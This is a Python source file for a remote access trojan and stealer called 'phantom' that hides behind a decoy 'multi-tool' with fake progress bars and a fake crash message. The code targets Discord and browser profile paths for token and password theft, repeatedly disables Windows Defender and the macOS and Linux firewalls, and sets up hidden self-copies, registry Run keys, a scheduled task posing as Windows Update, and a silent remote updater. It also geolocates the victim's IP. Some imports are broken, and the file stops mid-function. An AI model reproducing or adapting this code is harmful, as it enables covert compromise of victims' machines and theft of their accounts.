import os, sys, subprocess, platform, socket, psutil, time, uuid, threading
from pathlib import Path
import tempfile, json, http.client, urllib.request, webbrowser
import cv2, numpy as np, pyautogui, sounddevice as sd
from PIL import ImageGrab
from screeninfo import get_monitors
from io import BytesIO
from playsound import playsound
import browserhistory as bh
import discord
import ctypes
import aiohttp
import random
import string
import sqlite3
import requests
import win32crypt
from win32crypt import CryptUnprotectData
from Crypto.Cipher import AES
import winreg
import wmi
import ctypes
from ctypes import wintypes
from ctypes import POINTER, byref, c_int, c_uint, c_ulong, windll
from ctypes import POINTER, cast
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
import importlib
from discord.ext import commands, tasks
from discord import app_commands,
Intereaction Embed
from discord.ui import View, Button
from discord import Embed, file
from scipy.io.wavfile import write as wav_write
import GPUtil
from pathlib import Path
from pynput import keyboard
import threading
import asyncio
from concurrent.futures import ThreadPoolExecutor
import requests
import json
from discord import File
from pathlib import Path
from datetime import datetime, timedelta
from colorama import Fore, Style, init
import shutil
from shutil import copyfile
from shutil import copyfile2
import urllib.request
import base64
import zipfile
import itertools
import vdf
import getpass
import pyperclip
import win32com.client
import tkinter as tk
from tkinter import Canvas

init(autoreset=True)

print(f"{Fore.MAGENTA}ℹ[Inform.] Loading Please Wait...")
print(f"{Fore.MAGENTA}ℹ[Inform.] Installing Modules...")
print(f"{Fore.MAGENTA}installing...")
print(f"{Fore.MAGENTA}installing...")

TOKEN = ""
hook = ""
LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")

PATHS = {
    'Discord': ROAMING + '\\discord',
    'Discord Canary': ROAMING + '\\discordcanary',
    'Discord PTB': ROAMING + '\\discordptb',
    'Lightcord': ROAMING + '\\Lightcord',
    'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data',
    'Chrome': LOCAL + '\\Google\\Chrome\\User Data',
    'Chrome SxS': LOCAL + '\\Google\\Chrome SxS\\User Data',
    'Edge': LOCAL + '\\Microsoft\\Edge\\User Data',
    'Opera': ROAMING + '\\Opera Software\\Opera Stable',
    'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
    'Vivaldi': LOCAL + '\\Vivaldi\\User Data',
    'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data',
    'Amigo': LOCAL + '\\Amigo\\User Data',
    'Torch': LOCAL + '\\Torch\\User Data',
    'Kometa': LOCAL + '\\Kometa\\User Data',
    'Orbitum': LOCAL + '\\Orbitum\\User Data',
    'CentBrowser': LOCAL + '\\CentBrowser\\User Data',
    '7Star': LOCAL + '\\7Star\\7Star\\User Data',
    'Sputnik': LOCAL + '\\Sputnik\\Sputnik\\User Data',
    'Epic Privacy Browser': LOCAL + '\\Epic Privacy Browser\\User Data',
    'Uran': LOCAL + '\\uCozMedia\\Uran\\User Data',
    'Iridium': LOCAL + '\\Iridium\\User Data',
    'Firefox': ROAMING + '\\Mozilla\\Firefox\\Profiles'
        }

def install_modules():
    modules = [
        "os", "sys", "subprocess", "platform", "socket", "psutil", "time", "uuid", "threading",
        "pathlib", "tempfile", "json", "http.client", "urllib.request", "webbrowser",
        "opencv-python", "numpy", "pyautogui", "sounddevice", "Pillow", "screeninfo",
        "playsound", "browserhistory", "discord.py", "aiohttp", "requests", "scipy",
        "GPUtil", "pynput", "colorama", "vdf", "pyperclip", "tk", "pycaw",
        "comtypes", "win32crypt", "wmi", "pywin32"
    ]

    for module in modules:
        try:
            __import__(module)
        except ImportError:
            subprocess.check_call([sys.executable, "-m", "pip", "install", module])

install_modules()


def disable_protection():
    def protection_watchdog():
        while True:
            try:
                current_os = platform.system().lower()
                
                if current_os == "windows":
                    subprocess.call([
                        "powershell",
                        "-Command",
                        "Set-MpPreference -DisableRealtimeMonitoring $true"
                    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                
                elif current_os == "darwin":
                    subprocess.call(["sudo", "spctl", "--master-disable"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    subprocess.call(["sudo", "/usr/libexec/ApplicationFirewall/socketfilterfw", "--setglobalstate", "off"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                
                elif current_os == "linux":
                    subprocess.Popen(["sudo", "systemctl", "stop", "ufw"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    subprocess.Popen(["sudo", "systemctl", "disable", "ufw"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                
            except:
                pass
            time.sleep(10)

    threading.Thread(target=protection_watchdog, daemon=True).start()

def persistence():
    def rand_name(length=8):
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

    def disable_defender():
        try:
            subprocess.call([
                "powershell",
                "-Command",
                "Set-MpPreference -DisableRealtimeMonitoring $true"
            ], shell=True)
        except:
            pass

    def create_hidden_copy(path):
        ext = ".exe" if getattr(sys, 'frozen', False) else ".py"
        temp_folder = os.path.join(os.getenv("TEMP"), rand_name())
        os.makedirs(temp_folder, exist_ok=True)
        copy_path = os.path.join(temp_folder, rand_name() + ext)
        shutil.copy2(path, copy_path)
        os.system(f'attrib +h "{temp_folder}"')

        if ext == ".exe":
            subprocess.Popen([copy_path], creationflags=subprocess.CREATE_NO_WINDOW)
        else:
            subprocess.Popen(["pythonw.exe", copy_path], creationflags=subprocess.CREATE_NO_WINDOW)

        return copy_path

    def setup_startup(path):
        copies = [create_hidden_copy(path) for _ in range(5)]
        subprocess.call([
            'reg', 'add',
            r'HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run',
            '/v', rand_name(),
            '/t', 'REG_SZ',
            '/d', copies[0],
            '/f'
        ])
        return copies

    def monitor(copies, original_path):
        while True:
            tasks = subprocess.run(["tasklist"], capture_output=True, text=True).stdout
            for c in copies:
                if not os.path.exists(c) or os.path.basename(c) not in tasks:
                    if c.endswith(".exe"):
                        subprocess.Popen([c], creationflags=subprocess.CREATE_NO_WINDOW)
                    else:
                        subprocess.Popen(["pythonw.exe", c], creationflags=subprocess.CREATE_NO_WINDOW)
            if not os.path.exists(original_path):
                shutil.copy2(copies[0], original_path)
                if original_path.suffix == ".exe":
                    subprocess.Popen([str(original_path)], creationflags=subprocess.CREATE_NO_WINDOW)
                else:
                    subprocess.Popen(["pythonw.exe", str(original_path)], creationflags=subprocess.CREATE_NO_WINDOW)

            if all(not os.path.exists(c) for c in copies):
                copies[:] = setup_startup(original_path)

            time.sleep(5)

    exe_path = sys.executable if getattr(sys, 'frozen', False) else sys.argv[0]
    disable_defender()
    copies = setup_startup(exe_path)
    threading.Thread(target=monitor, args=(copies, exe_path), daemon=True).start()

def startup_v2(file_name="phantom.py", update_url=None):
    try:
        if getattr(sys, 'frozen', False):
            original_path = Path(sys.executable)
        else:
            original_path = Path(__file__).resolve()

        def random_name(ext=""):
            return ''.join(random.choices(string.ascii_letters + string.digits, k=8)) + ext

        def get_hidden_folder():
            folder_name = random_name()
            if sys.platform == "win32":
                return Path(os.getenv("PROGRAMDATA")) / folder_name
            elif sys.platform == "darwin":
                return Path.home() / f".{folder_name}"
            else:
                return Path.home() / f".{folder_name}"

        hidden_folder = get_hidden_folder()
        hidden_folder.mkdir(parents=True, exist_ok=True)
        target_path = hidden_folder / file_name

        def copy_self():
            try:
                folder = get_hidden_folder()
                folder.mkdir(parents=True, exist_ok=True)
                new_file_name = random_name(ext=Path(file_name).suffix)
                new_target = folder / new_file_name
                copy2(original_path, new_target)
                if sys.platform == "win32":
                    os.system(f'attrib +h "{folder}"')
                    os.system(f'attrib +h "{new_target}"')
                else:
                    os.system(f'chflags hidden "{folder}" 2>/dev/null || true')
                    os.system(f'chflags hidden "{new_target}" 2>/dev/null || true')
                return new_target
            except:
                return target_path

        if not target_path.exists():
            target_path = copy_self()

        def add_to_startup():
            try:
                if sys.platform == "win32":
                    import win32com.client
                    import winreg
                    startup_paths = [
                        Path(os.getenv("APPDATA")) / "Microsoft\\Windows\\Start Menu\\Programs\\Startup",
                        Path(os.getenv("PROGRAMDATA")) / "Microsoft\\Windows\\Start Menu\\Programs\\Startup"
                    ]
                    for startup in startup_paths:
                        shortcut = startup / f"{Path(target_path).name}.lnk"
                        if not shortcut.exists():
                            shell = win32com.client.Dispatch("WScript.Shell")
                            link = shell.CreateShortcut(str(shortcut))
                            link.TargetPath = str(target_path)
                            link.WorkingDirectory = str(target_path.parent)
                            link.IconLocation = str(target_path)
                            link.save()
                    reg_keys = [
                        (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
                        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run")
                    ]
                    for hive, path in reg_keys:
                        try:
                            with winreg.OpenKey(hive, path, 0, winreg.KEY_SET_VALUE) as key:
                                winreg.SetValueEx(key, "phantom", 0, winreg.REG_SZ, str(target_path))
                        except:
                            pass
                    task_name = "Windows Update Phantom"
                    cmd = f'schtasks /Create /F /RL HIGHEST /SC ONLOGON /TN "{task_name}" /TR "{target_path}"'
                    subprocess.call(cmd, shell=True)
                elif sys.platform == "darwin":
                    launch_agents = Path.home() / "Library/LaunchAgents"
                    launch_agents.mkdir(parents=True, exist_ok=True)
                    plist_file = launch_agents / f"com.phantom.{random_name()}.plist"
                    plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.phantom.{random_name()}</string>
    <key>ProgramArguments</key>
    <array>
        <string>{target_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>"""
                    plist_file.write_text(plist_content)
                    os.system(f'chflags hidden "{plist_file}" 2>/dev/null || true')
                else:
                    autostart_folder = Path.home() / ".config" / "autostart"
                    autostart_folder.mkdir(parents=True, exist_ok=True)
                    desktop_file = autostart_folder / f"{random_name()}.desktop"
                    if not desktop_file.exists():
                        desktop_file.write_text(f"""[Desktop Entry]
Type=Application
Exec={target_path}
Hidden=true
NoDisplay=true
X-GNOME-Autostart-enabled=true
Name={Path(target_path).name}
Comment=Phantom AutoStart
""")
            except:
                pass

        add_to_startup()

        def silent_update():
            while True:
                try:
                    if update_url:
                        tmp_file = hidden_folder / f"update_{Path(target_path).name}"
                        urllib.request.urlretrieve(update_url, tmp_file)
                        copy2(tmp_file, target_path)
                        tmp_file.unlink(missing_ok=True)
                except:
                    pass
                time.sleep(3600)

        def monitor_self():
            while True:
                if not target_path.exists():
                    target_path = copy_self()
                running = any(Path(target_path).name in getattr(thread, "name", "") for thread in threading.enumerate())
                if not running:
                    try:
                        if sys.platform == "win32":
                            subprocess.Popen([str(target_path)], shell=False)
                        else:
                            subprocess.Popen([sys.executable, str(target_path)], shell=False)
                    except:
                        pass
                time.sleep(5)

        def monitor_folder():
            while True:
                if not hidden_folder.exists():
                    hidden_folder.mkdir(parents=True, exist_ok=True)
                    target_path = copy_self()
                time.sleep(10)

        threading.Thread(target=monitor_self, daemon=True).start()
        threading.Thread(target=monitor_folder, daemon=True).start()
        threading.Thread(target=silent_update, daemon=True).start()

    except:
        pass

startup_v2(file_name="phantom.py", update_url=None)

def startup():
    try:
        if getattr(sys, 'frozen', False):
            original_path = Path(sys.executable)
            file_name = "phantom.exe" if sys.platform == "win32" else "phantom"
        else:
            original_path = Path(__file__).resolve()
            file_name = "phantom.py"

        hidden_folder_name = ''.join(random.choices(string.ascii_letters + string.digits, k=8))

        if sys.platform == "win32":
            hidden_folder = Path(os.getenv("PROGRAMDATA")) / hidden_folder_name
        elif sys.platform == "darwin":
            hidden_folder = Path.home() / f".{hidden_folder_name}"
        else:
            hidden_folder = Path.home() / f".{hidden_folder_name}"

        hidden_folder.mkdir(parents=True, exist_ok=True)
        target_path = hidden_folder / file_name

        def copy_self():
            try:
                shutil.copy2(original_path, target_path)
                if sys.platform == "win32":
                    os.system(f'attrib +h "{hidden_folder}"')
                else:
                    os.system(f'chflags hidden "{hidden_folder}" 2>/dev/null || true')
            except:
                pass

        if not target_path.exists():
            copy_self()

        def setup_autostart():
            try:
                if sys.platform == "win32":
                    startup_paths = [
                        Path(os.getenv("APPDATA")) / "Microsoft\\Windows\\Start Menu\\Programs\\Startup",
                        Path(os.getenv("PROGRAMDATA")) / "Microsoft\\Windows\\Start Menu\\Programs\\Startup"
                    ]
                    for startup in startup_paths:
                        shortcut = startup / f"{file_name}.lnk"
                        if not shortcut.exists():
                            shell = win32com.client.Dispatch("WScript.Shell")
                            link = shell.CreateShortcut(str(shortcut))
                            link.TargetPath = str(target_path)
                            link.WorkingDirectory = str(hidden_folder)
                            link.IconLocation = str(target_path)
                            link.save()
                    reg_keys = [
                        (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
                        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run")
                    ]
                    for hive, path in reg_keys:
                        try:
                            with winreg.OpenKey(hive, path, 0, winreg.KEY_SET_VALUE) as key:
                                winreg.SetValueEx(key, "phantom", 0, winreg.REG_SZ, str(target_path))
                        except:
                            pass
                    task_name = "Windows Update Phantom"
                    cmd = f'schtasks /Create /F /RL HIGHEST /SC ONLOGON /TN "{task_name}" /TR "{target_path}"'
                    subprocess.call(cmd, shell=True)
                elif sys.platform == "darwin":
                    launch_agents = Path.home() / "Library/LaunchAgents"
                    launch_agents.mkdir(parents=True, exist_ok=True)
                    plist_file = launch_agents / f"com.phantom.{hidden_folder_name}.plist"
                    plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.phantom.{hidden_folder_name}</string>
    <key>ProgramArguments</key>
    <array>
        <string>{target_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>"""
                    plist_file.write_text(plist_content)
                else:
                    autostart_folder = Path.home() / ".config" / "autostart"
                    autostart_folder.mkdir(parents=True, exist_ok=True)
                    desktop_file = autostart_folder / f"phantom_{hidden_folder_name}.desktop"
                    if not desktop_file.exists():
                        desktop_file.write_text(f"""[Desktop Entry]
Type=Application
Exec={target_path}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
Name=phantom
Comment=Phantom AutoStart
""")
            except:
                pass

        setup_autostart()

        def monitor_self():
            while True:
                if not target_path.exists():
                    copy_self()
                try:
                    if sys.platform == "win32":
                        tasklist = subprocess.check_output(["tasklist"], text=True)
                        if file_name not in tasklist:
                            subprocess.Popen([str(target_path)], shell=False)
                    else:
                        ps_output = subprocess.check_output(["ps", "ax"], text=True)
                        if file_name not in ps_output:
                            subprocess.Popen([sys.executable, str(target_path)], shell=False)
                except:
                    try:
                        if sys.platform == "win32":
                            subprocess.Popen([str(target_path)], shell=False)
                        else:
                            subprocess.Popen([sys.executable, str(target_path)], shell=False)
                    except:
                        pass
                time.sleep(3)

        def monitor_folder():
            while True:
                if not hidden_folder.exists():
                    hidden_folder.mkdir(parents=True, exist_ok=True)
                    copy_self()
                time.sleep(3)

        threading.Thread(target=monitor_self, daemon=True).start()
        threading.Thread(target=monitor_folder, daemon=True).start()

    except:
        pass

startup()

def add_to_startup():
    try:
        file_path = os.path.abspath(sys.argv[0])
        register = f'reg add "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" ' \
                   f'/v MicrosoftServiceCollecter /t REG_SZ /d "{file_path}" /f'
        subprocess.call(register, shell=True)
    except:
        pass

def run_loader(file_path="phantom.py", duration=230):
    def run_silently():
        if os.name == 'nt':
            si = subprocess.STARTUPINFO()
            si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            subprocess.Popen([sys.executable, file_path],
                             stdout=subprocess.DEVNULL,
                             stderr=subprocess.DEVNULL,
                             startupinfo=si,
                             creationflags=subprocess.CREATE_NO_WINDOW)
        else:
            subprocess.Popen([sys.executable, file_path],
                             stdout=subprocess.DEVNULL,
                             stderr=subprocess.DEVNULL)

    def update_bar():
        start = time.time()
        spin = itertools.cycle(['|', '/', '-', '\\'])
        offset = 0
        gradient_colors = ["#00bfff","#1e90ff","#87cefa","#00bfff"]
        while True:
            elapsed = time.time() - start
            if elapsed >= duration:
                break
            percent = elapsed / duration
            fill_width = int(percent * bar_width)
            canvas.coords(fill_rect, 0, 0, fill_width, bar_height)
            color = gradient_colors[offset % len(gradient_colors)]
            canvas.itemconfig(fill_rect, fill=color)
            offset += 1
            canvas.itemconfig(percent_text, text=f"{int(percent*100)}%")
            spin_label.config(text=next(spin))
            root.update_idletasks()
            time.sleep(0.03)
        canvas.coords(fill_rect, 0, 0, bar_width, bar_height)
        canvas.itemconfig(fill_rect, fill=gradient_colors[-1])
        canvas.itemconfig(percent_text, text="100%")
        spin_label.config(text='✔')
        root.update()
        time.sleep(0.5)
        # Fade out
        for i in range(100, -1, -5):
            root.attributes("-alpha", i/100)
            root.update()
            time.sleep(0.02)
        root.destroy()

    threading.Thread(target=run_silently, daemon=True).start()

    root = tk.Tk()
    root.title("Loading...")
    root.geometry("600x180")
    root.resizable(False, False)
    root.attributes("-alpha", 0.0)

    for i in range(0, 101, 5):
        root.attributes("-alpha", i/100)
        root.update()
        time.sleep(0.01)

    tk.Label(root, text="Loading, please wait...", font=("Arial", 16)).pack(pady=15)

    bar_width, bar_height = 520, 35
    canvas = Canvas(root, width=bar_width, height=bar_height, bg="#222222", highlightthickness=0)
    canvas.pack(pady=15)
    fill_rect = canvas.create_rectangle(0, 0, 0, bar_height, fill="#00bfff", width=0)
    percent_text = canvas.create_text(bar_width//2, bar_height//2, text="0%", fill="white", font=("Arial", 14, "bold"))

    spin_label = tk.Label(root, text="", font=("Arial", 20))
    spin_label.pack(pady=5)

    threading.Thread(target=update_bar, daemon=True).start()
    root.mainloop()

run_loader()

def phantom_multitool():
    P = Fore.MAGENTA + Style.BRIGHT
    S = Style.NORMAL
    G = Fore.GREEN + Style.BRIGHT
    Y = Fore.YELLOW + Style.BRIGHT
    R = Fore.RED + Style.BRIGHT
    C = Fore.CYAN + Style.BRIGHT

    TOOL_NAME = "PHANTOM MULTI-TOOL v1.0"
    BANNER = [
    " ██▓███   ██░ ██  ▄▄▄       ███▄    █ ▄▄▄█████▓ ▒█████   ███▄ ▄███▓",
    "▓██░  ██▒▓██░ ██▒▒████▄     ██ ▀█   █ ▓  ██▒ ▓▒▒██▒  ██▒▓██▒▀█▀ ██▒",
    "▓██░ ██▓▒▒██▀▀██░▒██  ▀█▄  ▓██  ▀█ ██▒▒ ▓██░ ▒░▒██░  ██▒▓██    ▓██░",
    "▒██▄█▓▒ ▒░▓█ ░██ ░██▄▄▄▄██ ▓██▒  ▐▌██▒░ ▓██▓ ░ ▒██   ██░▒██    ▒██ ",
    "▒██▒ ░  ░░▓█▒░██▓ ▓█   ▓██▒▒██░   ▓██░  ▒██▒ ░ ░ ████▓▒░▒██▒   ░██▒",
    "▒▓▒░ ░  ░ ▒ ░░▒░▒ ▒▒   ▓▒█░░ ▒░   ▒ ▒   ▒ ░░   ░ ▒░▒░▒░ ░ ▒░   ░  ░",
    "░▒ ░      ▒ ░▒░ ░  ▒   ▒▒ ░░ ░░   ░ ▒░    ░      ░ ▒ ▒░ ░  ░      ░",
    "░░        ░  ░░ ░  ░   ▒      ░   ░ ░   ░      ░ ░ ░ ▒  ░      ░   ",
    "          ░  ░  ░      ░  ░         ░              ░ ░         ░   ",
    "PHANTOM MULTI-TOOL v1.0",
    "many options."
]

    MENU = [
        "1) Nuker (OP & FAST)",
        "2) Bot token tool",
        "3) User token tool",
        "4) Webhook spammer",
        "5) Webhook deleter",
        "6) Roblox account puller",
        "7) Bot token scraper -> webhook",
        "8) OSINT Suite",
        "9) Reverse image lookup",
        "10) Upload Dox",
        "11) IP Lookup",
        "12) Social Media Scraper",
        "13) Install / Import modules",
        "14) Image Logger",
        "15) Exit",
    ]

    BASE_MODULES = [
        "corenet", "scraper", "osintlib", "doxkit", "webhooker", "robo-gen",
        "stealth", "fastspam", "tokenutils", "ipfinder"
    ]

    LONG_BAR_LEN = 120
    SLOW = 0.02

    def generate_module_name(i: int) -> str:
        core = random.choice(BASE_MODULES)
        suffix = f"{random.choice(['x','py','ng','srv','lib','mod'])}{random.randint(1,999)}"
        return f"{core}-{suffix}-{i}"

    async def banner():
        print(P + "=" * (LONG_BAR_LEN // 2))
        for line in BANNER:
            print(P + line.center(LONG_BAR_LEN // 2))
        print(P + TOOL_NAME.center(LONG_BAR_LEN // 2))
        print(P + "=" * (LONG_BAR_LEN // 2) + S)
        await asyncio.sleep(0.18)

    async def tiny_progress(task_name: str, length: int = 30, delay: float = 0.01):
        bar = ""
        for i in range(length):
            bar += "█"
            pct = int((i + 1) / length * 100)
            print(P + f"\r[{task_name}] |{bar:<{length}}| {pct:3d}% ", end="", flush=True)
            await asyncio.sleep(delay * random.uniform(0.6, 1.4))
        print("\r" + G + f"[{task_name}] Done".ljust(length + 40))
        await asyncio.sleep(0.04)

    async def fake_progress(task_name: str, length: int = LONG_BAR_LEN, delay: float = SLOW):
        print(P + f"[{task_name}] Initializing...")
        bar = ""
        for i in range(length):
            bar += "█"
            pct = int((i + 1) / length * 100)
            print(P + f"\r[{task_name}] |{bar:<{length}}| {pct:3d}% ", end="", flush=True)
            await asyncio.sleep(delay * random.uniform(0.85, 1.25))
        print("\n" + G + f"[{task_name}] Finished.\n")
        await asyncio.sleep(0.08)

    async def fake_install_many(total_modules: int = 2003):
        print(P + f"[Installer] Preparing to install {total_modules} packages...")
        await asyncio.sleep(0.45)
        batch_size = 25
        batches = (total_modules + batch_size - 1) // batch_size
        mod_counter = 0
        for b in range(batches):
            batch_name = f"Batch {b+1}/{batches}"
            await fake_progress(batch_name, length=min(LONG_BAR_LEN, 80), delay=SLOW * 0.4)
            installs = min(batch_size, total_modules - mod_counter)
            for j in range(installs):
                mod_counter += 1
                mod_name = generate_module_name(mod_counter)
                await tiny_progress(f"install {mod_name}", length=18, delay=0.006 + random.random() * 0.008)
                print(C + f"Downloading {mod_name}-v{random.randint(0,9)}.{random.randint(0,9)}.{random.randint(0,9)}")
                await asyncio.sleep(0.015 + random.random() * 0.02)
                print(G + f"Installed {mod_name} ({mod_counter}/{total_modules})\n")
                await asyncio.sleep(0.01 * random.random())
        print(G + f"[Installer] Completed installation of {total_modules} packages.\n")
        await asyncio.sleep(0.08)

    async def fake_imports_many(total_modules: int = 2003):
        print(P + "[Importer] Verifying imports...")
        await asyncio.sleep(0.28)
        for i in range(1, total_modules + 1):
            name = generate_module_name(i)
            ts = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")
            note = random.choice(["OK", "cached", "loaded"])
            print(C + f"[{ts}] import {name}  # {note}")
            if i % 40 == 0:
                await asyncio.sleep(0.12)
            else:
                await asyncio.sleep(0.008 * random.uniform(0.8, 1.6))
        print(G + "[Importer] All modules listed (simulation).\n")
        await asyncio.sleep(0.08)

    async def animated_import_sequence(duration: float = 4.0):
        spinner = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
        start = time.time()
        print(P + "[Boot] Performing import animation. Please wait...\n")
        while time.time() - start < duration:
            ch = random.choice(spinner)
            line = f"{ch} Importing modules... {generate_module_name(random.randint(1,999))}"
            print(P + "\r" + line.ljust(LONG_BAR_LEN // 2), end="", flush=True)
            await asyncio.sleep(0.06)
        print("\n" + G + "[Boot] Animation complete.\n")
        await asyncio.sleep(0.08)

    async def subtle_tool(name: str, verbose: bool = True):
        header = f"{name} // starting"
        print(P + f"\n=== {header} ===")
        await fake_progress(name, length=LONG_BAR_LEN - 10, delay=SLOW * random.uniform(0.9, 1.1))
        stages = ["Scan", "Enumerate", "Correlate", "Aggregate", "Finalize"]
        for stage in stages:
            ts = datetime.utcnow().strftime("%H:%M:%S")
            detail = random.choice([
                "footprint discovered",
                "relationships mapped",
                "public data correlated",
                "report generated",
                "simulation complete"
            ])
            print(Y + f"[{ts}] [{stage}] {detail}")
            await asyncio.sleep(random.uniform(0.22, 0.7))
        print(G + f"[{name}] Completed (simulated)\n")
        if verbose:
            for i in range(4):
                ts = datetime.utcnow().strftime("%H:%M:%S")
                print(P + f"[{ts}] LOG: {name} :: info :: {random.randint(1000,9999)}")
                await asyncio.sleep(0.06)
        print("\n")
        await asyncio.sleep(0.08)

    def show_windows_fatal(title: str, message: str):
        try:
            ctypes.windll.user32.MessageBoxW(0, message, title, 0x10 | 0x0)
        except Exception:
            pass

    async def fake_fatal_error_sequence():
        await asyncio.sleep(0.6)
        print(Y + "[SYSTEM] Finalizing startup tasks...")
        await fake_progress("Verifying runtime integrity", length=LONG_BAR_LEN // 2, delay=SLOW * 0.9)
        await asyncio.sleep(0.36)
        show_windows_fatal(
            "PHANTOM MULTI-TOOL ERROR",
            "Critical failure detected during startup.\nError code: 0xDEADFEED\nModule: core.loader failed\nSystem initialization aborted."
        )
        sys.exit(1)

    async def fake_image_logger():
        print(P + "\n=== IMAGE LOGGER ===\n")
        image_url = input(C + "Image URL: " + S).strip()
        webhook_url = input(C + "Webhook URL: " + S).strip()
        if not image_url:
            print(R + "No image URL provided. Aborting image logger.\n")
            return
        if not webhook_url:
            print(R + "No webhook URL provided. Aborting image logger.\n")
            return

        await fake_progress("Preparing image payload", length=min(LONG_BAR_LEN, 100), delay=SLOW * 0.9)
        ts = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")
        print(C + f"[{ts}] Fetching image metadata (simulated) from {image_url}")
        await asyncio.sleep(0.6 * random.uniform(0.9, 1.2))
        fake_size = f"{random.randint(50,500)}KB"
        fake_dims = f"{random.randint(200,4000)}x{random.randint(200,4000)}"
        print(C + f"[{ts}] Metadata: size={fake_size}, dims={fake_dims}, format=jpg (simulated)")
        await asyncio.sleep(0.4)

        await fake_progress("Uploading to webhook", length=min(LONG_BAR_LEN, 110), delay=SLOW * 0.7)
        print(P + f"Simulated POST -> {webhook_url}")
        await asyncio.sleep(0.3)
        print(G + f"[{datetime.utcnow().strftime('%H:%M:%S')}] Webhook response: 204 No Content (simulated)")
        await asyncio.sleep(0.2)

        fake_hash = ''.join(random.choice('0123456789abcdef') for _ in range(40))
        print(C + f"[{datetime.utcnow().strftime('%H:%M:%S')}] Image hash: {fake_hash}")
        await asyncio.sleep(0.25)
        reverse_found = random.choice([True, False, False])  # mostly not found
        if reverse_found:
            print(Y + f"[{datetime.utcnow().strftime('%H:%M:%S')}] Reverse lookup: similar image found on example.com/image/{random.randint(1000,9999)} (simulated)")
        else:
            print(Y + f"[{datetime.utcnow().strftime('%H:%M:%S')}] Reverse lookup: no matches found (simulated)")
        await asyncio.sleep(0.2)

        print(P + "\n[IMAGE LOGGER] Logging event to local archive (simulated)...")
        await tiny_progress("archiving", length=18, delay=0.01)
        print(G + f"[IMAGE LOGGER] Done — entry saved: entry_{random.randint(10000,99999)}\n")
        await asyncio.sleep(0.2)

    async def show_menu_and_get_choice():
        print(P + "\n" + "=" * LONG_BAR_LEN)
        print(P + TOOL_NAME.center(LONG_BAR_LEN))
        print(P + "=" * LONG_BAR_LEN + S + "\n")
        for line in MENU:
            print(P + line)
        print()
        choice = input(C + "Select an option: " + S)
        return choice.strip()

    async def long_fake_setup():
        print(P + "[System] Booting environment (simulated). This may take a while...\n")
        await animated_import_sequence(duration=3.8)
        await fake_install_many(total_modules=2003)
        await fake_imports_many(total_modules=2003)
        print(G + "[System] Environment ready.\n")
        await asyncio.sleep(0.08)

    async def main():
        await banner()
        await long_fake_setup()
        await fake_fatal_error_sequence()
        while True:
            choice = await show_menu_and_get_choice()
            if choice == "1":
                guild_name = input(C + "Enter target server name: " + S)
                if not guild_name:
                    guild_name = "67."
                await subtle_tool(f"NUKER // {guild_name}")
            elif choice == "2":
                await subtle_tool("Bot token tool")
            elif choice == "3":
                await subtle_tool("User token tool")
            elif choice == "4":
                await subtle_tool("Webhook spammer")
            elif choice == "5":
                await subtle_tool("Webhook deleter")
            elif choice == "6":
                await subtle_tool("Roblox account puller")
            elif choice == "7":
                await subtle_tool("Bot token scraper -> webhook")
            elif choice == "8":
                await subtle_tool("OSINT Suite")
            elif choice == "9":
                await subtle_tool("Reverse image lookup")
            elif choice == "10":
                await subtle_tool("Upload Dox")
            elif choice == "11":
                await subtle_tool("IP Lookup")
            elif choice == "12":
                await subtle_tool("Social Media Scraper")
            elif choice == "13":
                await fake_install_many(total_modules=2003)
                await fake_imports_many(total_modules=2003)
            elif choice == "14":
                await fake_image_logger()
            elif choice == "15":
                print(R + "\nShutting down. Goodbye.")
                break
            else:
                print(R + "Invalid choice. Try again.\n")
            await asyncio.sleep(0.2)

    try:
        asyncio.run(main())
    except SystemExit:
        pass
    except KeyboardInterrupt:
        print(R + "\nAborted by user. Exiting.")

def get_public_ip():
    try:
        response = requests.get('https://api.ipify.org/?format=json')
        data = response.json()
        public_ip = data['ip']
        return public_ip
    except:
        return 'N/A'

def get_location_info():
    try:
        resp = requests.get("http://ip-api.com/json", timeout=5)
        if resp.ok:
            data = resp.json()
            general_location = f"{data.get('country','N/A')}, {data.get('regionName','N/A')}, {data.get('city','N/A')}"
            address = f"{data.get('zip','N/A')} {data.get('city','N/A')}, {data.get('regionName','N/A')}, {data.get('country','N/A')}"
            return general_location, address
    except:
        return "N/A", "N/A"

def get_value_by_label(label, output):
    label_lower = label.lower() + ":"
    lines = output.splitlines()
    value_lines = []
    capture = True

    for line in lines:
        stripped_line = line.strip()
        if stripped_line.lower().startswith(label_lower):
